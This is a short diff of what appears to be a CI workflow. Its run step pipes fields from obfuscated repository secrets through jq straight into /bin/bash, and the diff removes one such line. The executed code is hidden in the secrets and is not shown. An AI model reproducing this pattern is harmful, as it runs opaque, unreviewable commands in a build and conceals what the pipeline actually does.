@@ -22,7 +22,6 @@ jobs:
           tzjns89: ${{ secrets.tzjns89 }}
         run: |
           printf '%s' "$tzjns89" | jq -r .tk931 | /bin/bash
-          echo $s0 | jq -r .lcprs243 | /bin/bash
           printf '%s' "$kqs661" | jq -r .ibael9479 | /bin/bash
 
       - name: Save results
